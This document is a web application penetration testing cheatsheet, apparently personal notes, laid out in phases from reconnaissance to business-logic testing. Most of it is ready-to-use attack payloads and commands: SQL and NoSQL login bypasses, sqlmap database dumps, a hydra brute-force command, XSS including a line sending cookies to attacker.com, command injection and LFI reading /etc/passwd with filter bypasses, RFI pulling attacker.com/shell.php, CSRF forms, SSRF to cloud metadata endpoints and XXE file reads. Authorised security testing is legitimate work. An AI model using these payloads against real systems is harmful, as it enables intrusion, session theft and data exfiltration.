# Web Application Penetration Testing Cheatsheet
```bash
#robots.txt, sitemap.xml etc.
USE DEBUGGER INSPECT ELEMENT... setup burp
LOOK FOR PWD, ADMIN, ETC., TEST USERS, CC

BRUTE FORCE LOGIN - INTRUDER
CHECK FOR ACCOUNT LOCKOUT MECHANISMS + 2FA + Encryption/hashing algorithm + PWD POLICY
SQLi in Login email and concat '-- - 
```
#Setup:
#XSS checker
```bash
git clone https://github.com/iinc0gnit0/RVuln

curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh

source $HOME/.cargo/env

cd RVuln
----> URL, x=$ , word= RVuln/default.txt
```
#OWASP ZAP
```bash
hydra -l admin -P /path/to/passwords.txt example.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
```
#Inspect Flags/Cookies
-> SameSite, HttpOnly


---

##  **Phase 1: Reconnaissance & Information Gathering**

### **Initial Enumeration**
```bash
Check robots.txt & sitemap.xml
#Download SecList
sudo apt install seclists
# Port scanning
nmap -sS -sV -O -A target_ip
nmap -p- --top-ports 1000 target_ip

# Web server fingerprinting
whatweb target_url
curl -I target_url
nikto -h target_url

# Directory/file enumeration
gobuster dir -u target_url -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
dirb target_url
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u target_url/FUZZ

# Subdomain enumeration
subfinder -d target_domain
amass enum -d target_domain

USE DEBUGGER INSPECT ELEMENT... setup burp
LOOK FOR PWD, ADMIN, ETC., TEST USERS, CC

BRUTE FORCE LOGIN - INTRUDER
CHECK FOR ACCOUNT LOCKOUT MECHANISMS + 2FA + Encryption/hashing algorithm + PWD POLICY
```

### **Technology Stack Identification**
```bash
# Check for common frameworks/technologies
curl -s target_url | grep -i "generator\|framework\|version"
wafw00f target_url

# Check robots.txt and sitemap
curl target_url/robots.txt
curl target_url/sitemap.xml
```

---

##  **Phase 2: Authentication & Authorization Testing**

### **Common Authentication Bypasses**
```bash
# SQL injection in login
' OR '1'='1' --
' OR '1'='1' #
admin' --
' UNION SELECT NULL,NULL--

# NoSQL injection
{"$ne": null}
{"$regex": ".*"}

# Default credentials testing
admin:admin, admin:password, root:root, administrator:admin
```

### **Session Management Testing**
```bash
# Session fixation
# Check if session ID changes after login

# Session hijacking
# Capture session tokens and test reuse

# Cookie security analysis
# Check for HttpOnly, Secure, SameSite flags
```

### **Authorization Testing**
```bash
# Horizontal privilege escalation
# Change user IDs in URLs/parameters
/user/profile?id=1 ‚Üí /user/profile?id=2

# Vertical privilege escalation
# Test admin endpoints with regular user session
/admin/users
/api/admin/delete-user
```

---

##  **Phase 3: Input Validation & Injection Attacks**

### **SQL Injection Testing**
```bash
# Basic payloads
' OR 1=1--
' UNION SELECT version()--
' UNION SELECT user()--
' UNION SELECT database()--

# Time-based blind SQLi
' AND (SELECT SLEEP(5))--
' OR (SELECT SLEEP(5))--

# Error-based SQLi
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--

# SQLMap automation
sqlmap -u "target_url?param=value" --dbs
sqlmap -u "target_url?param=value" --tables -D database_name
sqlmap -u "target_url?param=value" --dump -T table_name -D database_name
```

### **Cross-Site Scripting (XSS)**
```javascript
// Reflected XSS
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>


// Stored XSS
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>

// DOM-based XSS
#<script>alert('XSS')</script>
javascript:alert('XSS')
in the url query param = <iframe src="javascript:alert('xss')">

// Bypass filters
<ScRiPt>alert('XSS')</ScRiPt>
<script>alert(String.fromCharCode(88,83,83))</script>
```

### **Command Injection**
```bash
# Basic payloads
; ls -la
| whoami
&& cat /etc/passwd
`cat /etc/passwd`
$(cat /etc/passwd)

# Bypass filters
c'a't /etc/passwd
c\at /etc/passwd
/bin/cat /etc/passwd
```

### **Local File Inclusion (LFI)**
```bash
# Basic LFI
../../../etc/passwd
....//....//....//etc/passwd

# PHP filters
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php

# Log poisoning
/var/log/apache2/access.log
/var/log/nginx/access.log
```

### **Remote File Inclusion (RFI)**
```bash
# Basic RFI
http://attacker.com/shell.php
ftp://attacker.com/shell.php

# PHP wrappers
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
expect://ls
```

---

## üåê **Phase 4: Web-Specific Vulnerabilities**

### **Cross-Site Request Forgery (CSRF)**
```html
<!-- Basic CSRF -->
<form action="http://target.com/change-password" method="POST">
    <input type="hidden" name="password" value="newpassword">
    <input type="submit" value="Click me">
</form>

<!-- CSRF with AJAX -->
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://target.com/api/delete-user', true);
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send('{"user_id": 1}');
</script>
```

### **Server-Side Request Forgery (SSRF)**
```bash
# Basic SSRF
http://localhost
http://127.0.0.1
http://0.0.0.0
http://[::1]

# Cloud metadata
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/

# Bypass filters
http://127.1
http://127.0.1
http://2130706433 (decimal IP)
```

### **XML External Entity (XXE)**
```xml
<!-- Basic XXE -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- Blind XXE -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://attacker.com/xxe">
]>
<root>&xxe;</root>
```

---

##  **Phase 5: Configuration & Business Logic**

### **Insecure Direct Object Reference (IDOR)**
```bash
# Test parameter manipulation
/api/users/123 ‚Üí /api/users/124
/documents/user1/file.pdf ‚Üí /documents/user2/file.pdf

# UUID/GUID testing
/api/orders/550e8400-e29b-41d4-a716-446655440000
```

### **Security Misconfigurations**
```bash
# Check for debug modes
?debug=true
?test=true
X-Debug: true

# Check for backup files
index.php.bak
config.php~
.env
.git/config

# Check HTTP methods
curl -X OPTIONS target_url
curl -X TRACE target_url
curl -X PUT target_url
```

---

## üõ†Ô∏è **Essential Tools & Commands**

### **Burp Suite**
```bash
# Key features to use:
- Proxy for intercepting requests
- Repeater for manual testing
- Intruder for automated attacks
- Scanner for vulnerability detection
```

### **Browser Developer Tools**
```javascript
// Console commands
document.cookie
localStorage
sessionStorage
window.location
```

### **curl Commands**
```bash
# POST request
curl -X POST -d "param=value" target_url

# With headers
curl -H "Content-Type: application/json" -d '{"key":"value"}' target_url

# Follow redirects
curl -L target_url

# Show headers
curl -I target_url
```

---

---

##  **Quick Reference Commands**

```bash
# Quick recon
nmap -sS -sV target_ip
gobuster dir -u target_url -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
whatweb target_url

# Quick SQLi test
sqlmap -u "target_url?param=value" --batch --dbs

# Quick XSS test
<script>alert('XSS')</script>

# Quick LFI test
../../../etc/passwd

# Quick SSRF test
http://127.0.0.1
```

